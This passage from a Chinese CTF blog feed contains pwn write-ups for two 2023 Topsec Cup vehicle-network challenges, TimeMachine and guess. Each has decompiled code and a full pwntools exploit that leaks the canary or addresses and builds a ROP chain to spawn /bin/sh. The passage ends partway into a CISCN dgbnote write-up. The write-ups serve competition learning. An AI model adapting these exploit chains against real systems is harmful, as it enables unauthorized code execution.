          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023天融信杯车联网比赛初赛</title>
      <link href="/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次的比赛总共有三题pwn  两题出的比较新 一题就是考烂的伪随机数 这里就不收纳进入wp了</p><h2 id="TimeMachine"><a href="#TimeMachine" class="headerlink" title="TimeMachine"></a>TimeMachine</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032042208.png" title="image-20230703204157138" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032042208.png" alt="image-20230703204157138"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [rsp+16h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// [rsp+17h] [rbp-29h]</span></span><br><span class="line">  <span class="type">double</span> v9; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = <span class="number">31137.31337</span>;</span><br><span class="line">  ask_name(argc, argv, envp);</span><br><span class="line">  v8 = ask_number();</span><br><span class="line">  v3 = alloca(<span class="number">16</span> * ((<span class="number">8</span> * v8 + <span class="number">30</span>) / <span class="number">0x10</span>));</span><br><span class="line">  v10 = <span class="number">16</span> * ((&amp;v6 + <span class="number">7</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">    *(<span class="number">8LL</span> * i + v10) = <span class="number">0x40DE68540E410B63</span>LL;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-=-=-=-= CHALLENGE %03d =-=-=-=-\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    v4 = (<span class="number">8LL</span> * i + v10);</span><br><span class="line">    play_game();</span><br><span class="line">    *v4 = <span class="number">0x40DE68540E410B63</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v8 - <span class="number">1</span> || !ask_again() )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; *(<span class="number">8LL</span> * i + v10) )</span><br><span class="line">      v9 = *(<span class="number">8LL</span> * i + v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-=-=-=-= RESULT =-=-=-=-&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, name);</span><br><span class="line">  HIBYTE(v6) = HIBYTE(v9);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Best Score: %lf\n&quot;</span>, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑就是利用gettimeofday来实现一个控制时间的小游戏 输入想要间隔的时间 然后两次输入任意字符来开启和终止计时 不过程序本身并没有漏洞 漏洞主要出现在完成一次游戏后 是否还要继续的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">ask_again</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Play again? (Y/n) &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">  readuntil(<span class="number">10LL</span>);</span><br><span class="line">  <span class="keyword">return</span> v1[<span class="number">0</span>] != <span class="number">110</span> &amp;&amp; v1[<span class="number">0</span>] != <span class="number">78</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在了一个栈溢出漏洞 但是由于程序本身开启了canary 所以我们需要想办法获取canary的值 这里当然是特别关注一下程序的几个输出函数 看看有没有机会泄露</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032100916.png" title="image-20230703210052881" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032100916.png" alt="image-20230703210052881"></a></p><p>发现了这个printf函数的调用存在可疑点 其将rbp-0x48处的内容赋值给了rbp-0x58 我们通过gdb动调来查看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032102026.png" title="image-20230703210238001" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032102026.png" alt="image-20230703210238001"></a></p><p>可以看到相当于就是把canary赋值给了rsp指针指向的下一个字长处 这样的用意何在呢 可以看到随后就被赋值给了xmm0浮点数寄存器 这是printf函数利用%lf格式化字符输出数据的固定调用格式 会把调用时rsp的下一个字长内容输出</p><p>只要我们在ask_time函数中输入的v4不符合指定格式 那么v4就不会被赋值 从而我们可以泄露出canary 在后续的栈溢出中构造rop链</p><p>同时还有一点要注意的 由于是scanf引起的栈溢出 所以\x20 也就是空格 是无法被读入的 而本题的got表都位于0x602000处 所以我们需要泄露libc_start_main的基址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032142403.png" title="img" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032142403.png" alt="img"></a></p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.127.164.29&quot;,27917)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.binary = elf</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Time[sec]: &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40099F&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Stop the timer as close to &quot;</span>)</span><br><span class="line">t = io.recvuntil(<span class="string">&quot; &quot;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">canary = struct.pack(<span class="string">&quot;&lt;d&quot;</span>, <span class="built_in">float</span>(t))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Press ENTER to start / stop the timer.&quot;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Timer started.&quot;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Play again? (Y/n) &quot;</span>)</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = <span class="number">0x601ff0</span></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400e93</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">back_addr = <span class="number">0x40089B</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.puts(elf.got.__libc_start_main)</span><br><span class="line">rop.ask_again()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+canary+cyclic(<span class="number">0x8</span>)+p64(rdi_addr)+p64(libc_start_main_got)+p64(puts_plt)+p64(back_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400916&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x23fc0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Play again? (Y/n) &quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr :&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+canary+cyclic(<span class="number">0x8</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4008DB&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>这题的漏洞点和上题类似 不过考到了pthread_join线程函数带来的漏洞</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032158886.png" title="image-20230703215820845" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032158886.png" alt="image-20230703215820845"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">2</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_13E8();</span><br><span class="line">  v7 = sub_1594();</span><br><span class="line">  v3 = <span class="number">16</span> * ((<span class="number">8LL</span> * v7 + <span class="number">23</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( &amp;i != (&amp;i - (v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class="line">    ;</span><br><span class="line">  v4 = alloca(v3 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *(&amp;i + (v3 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>) = *(&amp;i + (v3 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>);</span><br><span class="line">  newthread[<span class="number">1</span>] = <span class="number">16</span> * ((newthread + <span class="number">7</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  sub_1552(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_4030; ++i )</span><br><span class="line">    sub_1485();</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I don&#x27;t think you won the game if you made it until here ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But maybe a threaded win can help?&quot;</span>);</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑都差不多 关键在于sub_1485这个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_4030 - <span class="number">1</span> == dword_402C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry, that was the last guess!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered %lu but the right number was %lu\n&quot;</span>, v1, v2);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果这是我们最后一次猜数字并且还猜错了 那么就会告诉我们正确的数字 注意了是用%lu输出的 来看一下汇编 会将rbp-0x18处的数据赋值给rsi寄存器 我们通过gdb动调来观察一下 如果我们不按要求输出数据 使得我们输入的数据为空 此时的rsi寄存器会被赋值成什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032200069.png" title="image-20230703220038033" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032200069.png" alt="image-20230703220038033"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032204015.png" title="image-20230703220402973" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032204015.png" alt="image-20230703220402973"></a></p><p>可以泄露elf的地址 由于开启了PIE 我们在不泄露libc地址的情况下很难构造rop链 这下子就可以构造了</p><p>接着我们来说说pthread_create这个线程函数 其无非就是创建了一个新的线程 并且指定了新的线程从start_routine函数开始</p><p>随后利用pthread_join函数 指定了在原本的线程结束后 开始执行新的线程</p><p>在这里你可以注意到 两个函数的第一个参数newthread 是用来规定新线程的内存单元 也就是说新线程的内存空间是旧线程的栈</p><p>而栈地址我们知道是由高地址到低地址的 TLS结构体的初始化 就会在高地址处  而start_routine函数提供了栈溢出的机会 那么我们就有机会溢出到tls结构体  由此里绕过canary 再加上我们前面泄露了elf的基址 接下来就是ret2libc的问题了</p><p>旧线程的栈地址: </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032218769.png" title="image-20230703221821725" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032218769.png" alt="image-20230703221821725"></a></p><p>新线程的栈地址 以及tls结构体存放的位置</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032219847.png" title="image-20230703221924790" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032219847.png" alt="image-20230703221924790"></a></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.127.164.29&quot;,27917)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the size : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the number of tries : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your guess : &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1507)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x16E0)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;You entered &quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>,drop = <span class="literal">True</span>),<span class="number">10</span>)-<span class="number">0x1579</span></span><br><span class="line">success(<span class="string">&quot;elf_addr :&quot;</span>+<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;But maybe a threaded win can help?&quot;</span>)</span><br><span class="line">puts_got = elf_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf_addr + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = elf_addr+<span class="number">0x0000000000001793</span></span><br><span class="line">back_addr = elf_addr + <span class="number">0x1436</span></span><br><span class="line">ret_addr = elf_addr + <span class="number">0x000000000000101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(back_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x858</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rax_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">syscall_addr = read_addr + <span class="number">0x10</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(rax_addr)+p64(<span class="number">59</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1484)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023Ciscn-dgbnote详解</title>
      <link href="/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>2023Ciscn华东南分区赛遇到的一题 觉得题目的考点非常新颖和有趣 所以打算仔细研究一下</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>题目用到了singal函数  该函数可以捕捉对应的信号 并且调用指定的信号处理函数</p><p>来看一下题目中所涉及到的两个single函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">signal(<span class="number">6</span>, handler);</span><br><span class="line">signal(<span class="number">14</span>, my_exit);</span><br></pre></td></tr></table></figure><p>第一个参数代表的是产生的信号 这里的6是SIGABRT 当进程非正常终止 调用abort函数的时候会触发</p><p>14是SIGALRM 如果程序设置的alarm函数超时 就会触发</p><p>下面是截取网上的大部分信号表格及其描述</p><table><thead><tr><th><strong>Signal</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>SIGABRT</td><td>由调用abort函数产生，进程非正常退出</td></tr><tr><td>SIGALRM</td><td>用alarm函数设置的timer超时或setitimer函数设置的interval timer超时</td></tr><tr><td>SIGBUS</td><td>某种特定的硬件异常，通常由内存访问引起</td></tr><tr><td>SIGCANCEL</td><td>由Solaris Thread Library内部使用，通常不会使用</td></tr><tr><td>SIGCHLD</td><td>进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略</td></tr><tr><td>SIGCONT</td><td>当被stop的进程恢复运行的时候，自动发送</td></tr><tr><td>SIGEMT</td><td>和实现相关的硬件异常</td></tr><tr><td>SIGFPE</td><td>数学相关的异常，如被0除，浮点溢出，等等</td></tr><tr><td>SIGFREEZE</td><td>Solaris专用，Hiberate或者Suspended时候发送</td></tr><tr><td>SIGHUP</td><td>发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送</td></tr><tr><td>SIGILL</td><td>非法指令异常</td></tr><tr><td>SIGINFO</td><td>BSD signal。由Status Key产生，通常是CTRL+T。发送给所有Foreground Group的进程</td></tr><tr><td>SIGINT</td><td>由Interrupt Key产生，通常是CTRL+C或者DELETE。发送给所有ForeGround Group的进程</td></tr><tr><td>SIGIO</td><td>异步IO事件</td></tr><tr><td>SIGIOT</td><td>实现相关的硬件异常，一般对应SIGABRT</td></tr><tr><td>SIGKILL</td><td>无法处理和忽略。中止某个进程</td></tr><tr><td>SIGLWP</td><td>由Solaris Thread Libray内部使用</td></tr><tr><td>SIGPIPE</td><td>在reader中止之后写Pipe的时候发送</td></tr><tr><td>SIGPOLL</td><td>当某个事件发送给Pollable Device的时候发送</td></tr><tr><td>SIGPROF</td><td>Setitimer指定的Profiling Interval Timer所产生</td></tr><tr><td>SIGPWR</td><td>和系统相关。和UPS相关。</td></tr><tr><td>SIGQUIT</td><td>输入Quit Key的时候（CTRL+\）发送给所有Foreground Group的进程</td></tr><tr><td>SIGSEGV</td><td>非法内存访问</td></tr><tr><td>SIGSTKFLT</td><td>Linux专用，数学协处理器的栈异常</td></tr><tr><td>SIGSTOP</td><td>中止进程。无法处理和忽略。</td></tr><tr><td>SIGSYS</td><td>非法系统调用</td></tr><tr><td>SIGTERM</td><td>请求中止进程，kill命令缺省发送</td></tr><tr><td>SIGTHAW</td><td>Solaris专用，从Suspend恢复时候发送</td></tr><tr><td>SIGTRAP</td><td>实现相关的硬件异常。一般是调试异常</td></tr><tr><td>SIGTSTP</td><td>Suspend Key，一般是Ctrl+Z。发送给所有Foreground Group的进程</td></tr><tr><td>SIGTTIN</td><td>当Background Group的进程尝试读取Terminal的时候发送</td></tr><tr><td>SIGTTOU</td><td>当Background Group的进程尝试写Terminal的时候发送</td></tr><tr><td>SIGURG</td><td>当out-of-band data接收的时候可能发送</td></tr><tr><td>SIGUSR1</td><td>用户自定义signal 1</td></tr><tr><td>SIGUSR2</td><td>用户自定义signal 2</td></tr><tr><td>SIGVTALRM</td><td>setitimer函数设置的Virtual Interval Timer超时的时候</td></tr><tr><td>SIGWAITING</td><td>Solaris Thread Library内部实现专用</td></tr><tr><td>SIGWINCH</td><td>当Terminal的窗口大小改变的时候，发送给Foreground Group的所有进程</td></tr><tr><td>SIGXCPU</td><td>当CPU时间限制超时的时候</td></tr><tr><td>SIGXFSZ</td><td>进程超过文件大小限制</td></tr><tr><td>SIGXRES</td><td>Solaris专用，进程超过资源限制的时候发送</td></tr></tbody></table><h2 id="readlink"><a href="#readlink" class="headerlink" title="readlink"></a>readlink</h2><p>该函数用于获取当前程序的绝对路径</p><p>其一共有三个参数 第一个参数代表一个符号链接 第二个参数代表要存储的空间 第三个参数代表多少字节</p><p>而&#x2F;proc&#x2F;self&#x2F;exe指向当前程序的绝对路径 所以原题中的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, v2, <span class="number">0x4F</span>uLL);</span><br></pre></td></tr></table></figure><p>就相当于获取当前程序的绝对路径 并且存储到v2内存空间中</p><h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>配合上面我们得到v2中存储的是当前程序的绝对路径</p><p>题目中的这一行 相当于就是重新运行了程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(v2, *&amp;buf[<span class="number">56</span>], *&amp;buf[<span class="number">48</span>]);</span><br></pre></td></tr></table></figure><p>第二个和第三个参数用来规定新线程中的argv和envp参数</p><h2 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h2><p>简单来说 argv就是传入main函数的参数数组 其中argv[0]是程序名 本题中main函数一开就对argv的参数做了检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v4 = a2[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;dbg&quot;</span>) )</span><br><span class="line">    sub_1B70();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v4, <span class="string">&quot;run&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果为dbg 那么就可以进入sub_1b70函数 这个函数中存在任意写的机会</p><p>而如果程序的argv[1]参数不是run 就会终止程序 在远程环境中 默认就是以run为参数运行的程序 在我们本地复现的时候 需要注意手动加上参数</p><p><a 